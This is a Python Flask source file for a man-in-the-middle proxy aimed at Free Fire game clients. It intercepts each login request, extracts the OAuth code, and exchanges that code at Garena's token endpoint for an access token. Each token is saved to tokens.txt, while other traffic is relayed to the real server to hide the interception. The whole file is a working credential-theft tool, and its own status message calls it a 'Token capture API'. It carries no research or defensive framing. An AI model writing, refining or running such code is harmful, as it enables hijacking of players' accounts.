from flask import Flask, request, jsonify, Response
import requests
import os
import re
import json
from datetime import datetime

# Try to import black-apis for protobuf parsing
try:
    from black_apis.freefire import protos
    from google.protobuf import message
    HAS_PROTO = True
except ImportError:
    HAS_PROTO = False
    print("⚠️ black-apis not installed. Falling back to regex.")

app = Flask(__name__)

# ─── CONFIGURATION ──────────────────────────────────────────────
REAL_SERVER = os.environ.get('REAL_SERVER_URL', 'https://client.ind.freefiremobile.com')
TOKEN_URL = "https://auth.garena.com/oauth/token"
CLIENT_ID = "100067"
REDIRECT_URI = "https://api.ff.garena.co.id/auth/auth/callback_n?site=https://api-discountstore.kiosgamer.gameid.garena.co.id/oauth/callback_redirect/"

active_users = []
# ─────────────────────────────────────────────────────────────────

def extract_oauth_code_protobuf(raw_data):
    """Try to extract OAuth code from protobuf using black-apis."""
    if not HAS_PROTO:
        return None
    try:
        # Try the most common message type: LoginRequest
        msg = protos.LoginRequest()
        msg.ParseFromString(raw_data)
        # Search all fields for 'code'
        for field in msg.DESCRIPTOR.fields:
            if 'code' in field.name.lower():
                val = getattr(msg, field.name, None)
                if val:
                    return str(val)
        # Check common attributes directly
        if hasattr(msg, 'code'):
            return str(msg.code)
        if hasattr(msg, 'oauth_code'):
            return str(msg.oauth_code)
    except Exception as e:
        print(f"Protobuf parse error: {e}")
    return None

def extract_oauth_code_regex(raw_data):
    """Fallback: regex search for likely OAuth code pattern."""
    # Look for common prefixes: '4/' (Google), 'EA' (Facebook), etc.
    pattern = re.compile(rb'(4\/[a-zA-Z0-9_-]+|EA[a-zA-Z0-9_-]+|[a-zA-Z0-9_-]{30,50})')
    matches = pattern.findall(raw_data)
    for match in matches:
        code = match.decode('utf-8', errors='ignore')
        if len(code) >= 20:
            return code
    return None

def exchange_code_for_tokens(code):
    payload = {
        "grant_type": "authorization_code",
        "code": code,
        "client_id": CLIENT_ID,
        "redirect_uri": REDIRECT_URI
    }
    try:
        resp = requests.post(TOKEN_URL, data=payload, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            hex_token = data.get('access_token')
            return hex_token
        else:
            print(f"Exchange failed: {resp.status_code}")
            return None
    except Exception as e:
        print(f"Exchange error: {e}")
        return None

@app.route('/user/<user_id>/', defaults={'subpath': ''}, methods=['GET', 'POST'])
@app.route('/user/<user_id>/<path:subpath>', methods=['GET', 'POST'])
def handle_request(user_id, subpath):
    print(f"\n🔹 {request.method} /user/{user_id}/{subpath}")

    if user_id not in active_users:
        active_users.append(user_id)
        print(f"👤 New user: {user_id}")

    if subpath == "GetLoginData":
        raw_data = request.get_data()
        print(f"📦 Received {len(raw_data)} bytes")

        # Try protobuf first
        oauth_code = extract_oauth_code_protobuf(raw_data)
        if not oauth_code:
            oauth_code = extract_oauth_code_regex(raw_data)

        # If still nothing, log the first 200 bytes as hex for debugging
        if not oauth_code:
            hex_preview = raw_data[:200].hex()
            print(f"⚠️ No code found. Raw hex preview: {hex_preview}")

        if oauth_code:
            print(f"🔑 OAuth code: {oauth_code[:20]}...")
            hex_token = exchange_code_for_tokens(oauth_code)
            if hex_token:
                print(f"🎯 HEX ACCESS TOKEN: {hex_token}")
                with open("tokens.txt", "a") as f:
                    f.write(f"{datetime.now()} | {user_id} | {hex_token}\n")
            else:
                print("❌ No hex token returned.")
        else:
            print("⚠️ No OAuth code found in request.")

        return jsonify({"status": "success", "message": "OK"}), 200

    # Forward other requests
    try:
        real_url = f"{REAL_SERVER}/{subpath}" if subpath else REAL_SERVER
        headers = {k: v for k, v in request.headers if k.lower() not in ['host', 'connection']}
        headers.pop('Content-Length', None)
        headers['Host'] = 'client.ind.freefiremobile.com'

        resp = requests.request(
            method=request.method,
            url=real_url,
            headers=headers,
            data=request.get_data(),
            params=request.args,
            allow_redirects=False,
            timeout=30
        )
        excluded = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
        resp_headers = [(k, v) for k, v in resp.raw.headers.items() if k.lower() not in excluded]
        return Response(resp.content, status=resp.status_code, headers=resp_headers)
    except Exception as e:
        print(f"❌ Forward error: {e}")
        return jsonify({"status": "success", "message": "OK"}), 200

@app.route('/')
def admin():
    return jsonify({
        "active_users": active_users,
        "message": "Token capture API running"
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)